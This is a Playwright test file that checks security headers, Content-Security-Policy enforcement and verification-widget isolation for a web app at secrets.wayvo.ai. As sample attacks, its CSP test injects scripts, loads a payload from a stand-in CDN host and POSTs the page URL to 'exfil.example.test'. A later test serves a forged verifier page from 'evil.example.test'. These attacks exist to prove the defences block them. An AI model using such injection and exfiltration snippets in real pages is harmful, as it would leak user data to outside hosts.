import { readFileSync } from "node:fs";
import { test, expect, type Page } from "@playwright/test";
const verifier = "https://verify.secrets.wayvo.ai";
const channel = "11111111-1111-4111-8111-111111111111";
const sitekey = "1x00000000000000000000AA";
const bridgePolicy = `default-src 'none'; script-src 'self'; frame-src ${verifier}; connect-src 'none'; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'`;
declare global {
  interface Window {
    __inline?: boolean;
    __external?: boolean;
    __proof?: string;
    __violations: string[];
  }
}
function directive(policy: string | undefined, name: string) {
  return policy
    ?.split(";")
    .map((part) => part.trim())
    .find((part) => part.startsWith(`${name} `));
}
// Parses a single-rule `_headers` file such as verification/_headers.
function headersFile(path: string) {
  return Object.fromEntries(
    readFileSync(path, "utf8")
      .split("\n")
      .slice(1)
      .filter((line) => line.trim())
      .map((line) => {
        const colon = line.indexOf(":");
        return [line.slice(0, colon).trim(), line.slice(colon + 1).trim()];
      }),
  );
}
async function recordViolations(page: Page) {
  await page.addInitScript(() => {
    window.__violations = [];
    document.addEventListener("securitypolicyviolation", (event) =>
      window.__violations.push(event.effectiveDirective),
    );
  });
}

test("app pages, the bridge and the API send restrictive headers", async ({
  request,
}) => {
  for (const path of ["/", "/s", "/d", "/security", "/privacy"]) {
    const response = await request.get(path);
    expect(response.status(), path).toBe(200);
    const headers = response.headers(),
      policy = headers["content-security-policy"];
    expect(directive(policy, "script-src"), path).toMatch(
      /^script-src 'self'( 'sha256-[A-Za-z0-9+/]+=')+$/,
    );
    for (const expected of [
      "default-src 'self'",
      "connect-src 'self'",
      "frame-src 'none'",
      "object-src 'none'",
      "base-uri 'none'",
      "form-action 'self'",
      "frame-ancestors 'none'",
    ])
      expect(policy, path).toContain(expected);
    expect(headers["referrer-policy"], path).toBe("no-referrer");
    expect(headers["cache-control"], path).toBe("no-store");
    expect(headers["x-content-type-options"], path).toBe("nosniff");
    expect(headers["cross-origin-opener-policy"], path).toBe("same-origin");
    expect(headers["strict-transport-security"], path).toContain("max-age=");
  }
  for (const path of ["/s", "/d"])
    expect((await request.get(path)).headers()["x-robots-tag"], path).toContain(
      "noindex",
    );
  for (const path of ["/verify", "/verify.html"]) {
    const response = await request.get(path, { maxRedirects: 0 }),
      policies = response
        .headersArray()
        .filter(({ name }) => name.toLowerCase() === "content-security-policy");
    expect(
      policies.map(({ value }) => value),
      path,
    ).toEqual([bridgePolicy]);
    expect(response.headers()["referrer-policy"], path).toBe("no-referrer");
  }
  const api = await request.get("/api/dashboard"),
    headers = api.headers();
  // 401 with a migrated local D1, 503 without (as in CI); headers apply to both.
  expect(api.status()).toBeGreaterThanOrEqual(400);
  expect(headers["content-security-policy"]).toBe(
    "default-src 'none'; frame-ancestors 'none'",
  );
  expect(headers["cache-control"]).toBe("no-store");
  expect(headers["referrer-policy"]).toBe("no-referrer");
  expect(headers["x-content-type-options"]).toBe("nosniff");
  expect(headers["x-robots-tag"]).toContain("noindex");
});

test("CSP blocks injected scripts and outside connections", async ({
  page,
}) => {
  // Outside hosts answer successfully, so only the policy can stop them; a
  // request reaching this handler got past CSP.
  const reached: string[] = [];
  await page.route("https://*.example.test/**", (route) => {
    reached.push(route.request().url());
    return route.fulfill({
      contentType: "text/javascript",
      headers: { "access-control-allow-origin": "*" },
      body: "window.__external = true;",
    });
  });
  await recordViolations(page);
  for (const path of ["/", "/s"]) {
    await page.goto(path);
    const result = await page.evaluate(async () => {
      const inline = document.createElement("script");
      inline.textContent = "window.__inline = true;";
      document.head.appendChild(inline);
      await new Promise((resolve) => {
        const external = document.createElement("script");
        external.src = "https://cdn.example.test/payload.js";
        external.onload = external.onerror = resolve;
        document.head.appendChild(external);
      });
      const connect = await fetch("https://exfil.example.test/collect", {
        method: "POST",
        body: location.href,
      }).then(
        () => "connected",
        () => "blocked",
      );
      // Violation events are dispatched asynchronously.
      await new Promise((resolve) => setTimeout(resolve, 50));
      return {
        inline: window.__inline === true,
        external: window.__external === true,
        connect,
        violations: window.__violations,
      };
    });
    expect(result, path).toEqual({
      inline: false,
      external: false,
      connect: "blocked",
      violations: expect.arrayContaining(["script-src-elem", "connect-src"]),
    });
  }
  expect(reached).toEqual([]);
});

test("real verification widget runs isolated and returns proof through the bridge", async ({
  page,
  baseURL,
}) => {
  const app = "https://secrets.wayvo.ai";
  const verificationHeaders = headersFile("verification/_headers");
  // Serve the built app under its production origin, so widget.js's parent
  // allowlist and the verifier's frame-ancestors apply without modification.
  await page.route(`${app}/**`, async (route) => {
    const url = new URL(route.request().url());
    const response = await route.fetch({
      url: `${baseURL}${url.pathname}${url.search}`,
      maxRedirects: 0,
    });
    await route.fulfill({ response });
  });
  // Serve verification/ exactly as deployed, with its own _headers.
  await page.route(`${verifier}/**`, (route) => {
    const path = new URL(route.request().url()).pathname;
    const file = path === "/" ? "index.html" : path.slice(1);
    if (!["index.html", "widget.js"].includes(file))
      return route.fulfill({ status: 404 });
    return route.fulfill({
      headers: {
        ...verificationHeaders,
        "content-type": file.endsWith(".js") ? "text/javascript" : "text/html",
      },
      body: readFileSync(`verification/${file}`),
    });
  });
  // Stand-in for Cloudflare's script; it proves where third-party code runs.
  const turnstileFrames: string[] = [];
  await page.route(
    (url) => url.hostname === "challenges.cloudflare.com",
    (route) => {
      turnstileFrames.push(new URL(route.request().frame().url()).origin);
      return route.fulfill({
        contentType: "text/javascript",
        body: `window.turnstile = { render(element, options) {
          let token = "storage-was-accessible";
          try { window.parent.localStorage.getItem("isolation-test"); } catch { token = "isolated-proof"; }
          options.callback(token);
        } };`,
      });
    },
  );
  await page.addInitScript(
    ({ app, channel }) => {
      if (location.origin !== app) return;
      localStorage.setItem("isolation-test", "private-dashboard-capability");
      const bus = new BroadcastChannel(channel);
      bus.onmessage = (event) => {
        window.__proof = event.data;
        bus.close();
      };
    },
    { app, channel },
  );
  await page.goto(
    `${app}/verify#${new URLSearchParams({ channel, action: "dashboard", sitekey, verifier })}`,
  );
  await expect
    .poll(() => page.evaluate(() => window.__proof))
    .toBe("isolated-proof");
  expect(turnstileFrames).toEqual([verifier]);
});

test("bridge cannot embed an unapproved verifier", async ({ page }) => {
  const forged = "https://evil.example.test";
  const contacted: string[] = [];
  page.on("request", (request) => {
    if (request.url().startsWith(forged)) contacted.push(request.url());
  });
  await page.route(`${forged}/**`, (route) =>
    route.fulfill({
      contentType: "text/html",
      body: `<script>parent.postMessage({ type: "verified", channel: "${channel}", token: "forged" }, "*");</script>`,
    }),
  );
  await recordViolations(page);
  await page.addInitScript((channel) => {
    const bus = new BroadcastChannel(channel);
    bus.onmessage = (event) => {
      window.__proof = event.data;
    };
  }, channel);
  await page.goto(
    `/verify#${new URLSearchParams({ channel, action: "dashboard", sitekey, verifier: forged })}`,
  );
  await expect
    .poll(() => page.evaluate(() => window.__violations))
    .toContain("frame-src");
  expect(await page.evaluate(() => window.__proof)).toBeUndefined();
  expect(contacted).toEqual([]);
});
